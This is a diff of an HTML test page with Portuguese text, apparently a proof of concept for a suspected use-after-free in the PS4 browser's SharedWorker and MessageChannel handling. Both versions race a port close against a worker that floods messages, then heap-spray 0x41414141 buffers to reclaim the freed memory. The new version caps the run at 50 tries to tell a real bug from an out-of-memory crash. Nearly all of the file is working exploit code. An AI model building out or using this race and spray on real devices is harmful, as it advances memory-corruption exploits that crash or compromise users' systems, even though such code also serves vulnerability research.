@@ -2,124 +2,101 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 UAF Verifier</title>      
+    <title>PS4 UAF - Teste de Prova Real</title>
+    <style>
+        body { background-color: #1a1a1a; color: #fff; font-family: sans-serif; font-size: 20px; padding: 20px; }
+        #counter { font-size: 80px; font-weight: bold; color: yellow; }
+        .log-box { font-size: 14px; color: #aaa; margin-top: 20px; }
+    </style>
 </head>
 <body>
 
-    <div class="section">
-        <h2>SharedWorker UAF Verifier</h2>       
-        <p>Status: <span id="status">Pronto</span></p>
-
-        <label>Delay de Fechamento (ms): <input type="number" id="delayInput" value="2"></label>
-        <br><br>
-        <button onclick="startTest()">Iniciar Teste Controlado</button>
-        <button onclick="stopTest()">Parar</button>
-    </div>
-
-    <div id="log" style="border:1px solid #ccc; height:300px; overflow-y:scroll; font-family:monospace; margin-top:10px;"></div>
+    <h2>UAF Check - Limite 50</h2>
+    <p>Se o console desligar antes do contador chegar em 50, é BUG VÁLIDO (UAF).</p>
+    <p>Se chegar em 50 e parar, o bug anterior era apenas falta de memória.</p>
+    
+    <div>Tentativa Atual:</div>
+    <div id="counter">0</div>
+    
+    <br>
+    <button onclick="startVerification()" style="padding: 15px 30px; font-size: 20px;">INICIAR VERIFICAÇÃO</button>
+    
+    <div id="log" class="log-box"></div>
 
     <script>
-        let isRunning = false;
         let iteration = 0;
-        
-        function log(msg) { 
-            const el = document.getElementById('log');
-            el.innerHTML = `<div>[${iteration}] ${msg}</div>` + el.innerHTML;
-        }      
+        const MAX_ITERATIONS = 50; // Limite baixo para provar que não é DoS por quantidade
 
-        // Tenta preencher a memória rapidamente após o 'free'
-        function heapSpray() {
-            let spray = [];
-            // Cria vários ArrayBuffers preenchidos com 0x41 (A)
-            // Se o sistema tentar ler a memória liberada e ler 0x41414141,
-            // confirmamos que controlamos o objeto (mesmo sem ver o log UART).
-            for (let i = 0; i < 200; i++) {
-                let arr = new Uint32Array(128);
-                arr.fill(0x41414141); 
-                spray.push(arr);
-            }
-            return spray;
+        function log(msg) {
+            document.getElementById('log').innerText = msg;
         }
 
-        async function startTest() {
-            if (isRunning) return;
-            isRunning = true;
+        function updateCounter(val) {
+            document.getElementById('counter').innerText = val;
+        }
+
+        // Tenta forçar o Garbage Collector criando lixo e descartando
+        function forceGC() {
+            let a = [];
+            for(let i=0; i<1000; i++) a.push(new Uint8Array(1000));
+            a = null; 
+        }
+
+        async function startVerification() {
             iteration = 0;
-            document.getElementById('status').innerText = "Rodando...";
-            document.getElementById('status').style.color = "red";
-            
-            const delay = parseInt(document.getElementById('delayInput').value);
-            
-            // Código do Worker que bombardeia a porta com padrão específico
             const workerCode = `
                 onmessage = (e) => {
-                    const port = e.ports[0];
-                    const payload = new Uint32Array(32);
-                    payload.fill(0x41414141); // Padrão 'AAAA' para debug
-                    
-                    // Loop infinito de alta velocidade
-                    setInterval(() => {
-                        // Tenta enviar mensagem. Se a porta do outro lado
-                        // foi fechada e a memória liberada incorretamente,
-                        // isso pode causar o panic.
-                        try {
-                            port.postMessage(payload);
-                        } catch(e) {}
-                    }, 0);
+                    const p = e.ports[0];
+                    const pl = new Uint32Array(32); pl.fill(0x41414141);
+                    setInterval(() => { try { p.postMessage(pl); } catch(e){} }, 0);
                 }
             `;
             const blobUrl = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
 
-            while(isRunning) {
+            log("Iniciando bateria de testes...");
+
+            while(iteration < MAX_ITERATIONS) {
                 iteration++;
-                await runSingleRace(blobUrl, delay);
+                updateCounter(iteration);
+
+                // 1. Pausa visual obrigatória para garantir que o número atualize na TV
+                await new Promise(r => setTimeout(r, 100));
+
+                // 2. Executa a tentativa de crash
+                await runRace(blobUrl);
+
+                // 3. Limpeza agressiva entre tentativas
+                forceGC();
                 
-                // Pequena pausa para o Garbage Collector respirar e não travar por OOM
-                if(iteration % 10 === 0) {
-                    log("--- Pausa para GC ---");
-                    await new Promise(r => setTimeout(r, 200));
-                }
+                // Pausa para o sistema respirar
+                await new Promise(r => setTimeout(r, 50));
             }
+
+            log("SUCESSO: O sistema sobreviveu a 50 tentativas. Provavelmente o crash anterior era apenas falta de memória (DoS), não um exploit estável.");
+            document.getElementById('counter').style.color = "#00ff00"; // Verde
         }
 
-        function stopTest() {
-            isRunning = false;
-            document.getElementById('status').innerText = "Parado";
-            document.getElementById('status').style.color = "black";
-        }
-
-        function runSingleRace(url, delayMs) {
+        function runRace(url) {
             return new Promise((resolve) => {
                 const mc = new MessageChannel();
-                
-                // Adiciona timestamp único para forçar nova instância do worker
-                const sw = new SharedWorker(url, "race_" + iteration);
-                
+                // Usa nome único para evitar cache do worker
+                const sw = new SharedWorker(url, "chk_" + iteration + "_" + Date.now());
                 sw.port.start();
-                
-                // Envia a porta para o worker começar o bombardeio
-                sw.port.postMessage("init", [mc.port2]);
+                sw.port.postMessage("go", [mc.port2]);
 
-                // O MOMENTO CRÍTICO
                 setTimeout(() => {
-                    // 1. Fecha a porta (Free)
+                    // O GATILHO
                     sw.port.close();
                     mc.port1.close();
                     
-                    // 2. Tenta sobrescrever a memória liberada imediatamente (Re-alloc)
-                    // Se houver um Use-After-Free, o worker vai escrever em cima deste spray
-                    let trash = heapSpray(); 
+                    // Spray rápido
+                    let spray = new Uint32Array(1024);
+                    spray.fill(0x41414141);
                     
-                    // Limpeza visual
-                    sw.port.onmessage = null;
-                    
-                    // Retorna após um breve momento
                     setTimeout(() => {
-                        trash = null; // Libera o spray
                         resolve();
-                    }, 10);
-                    
-                }, delayMs);
+                    }, 10); // Janela curta
+                }, 2); // Delay fixo de 2ms (ajuste se necessário)
             });
         }
     </script>
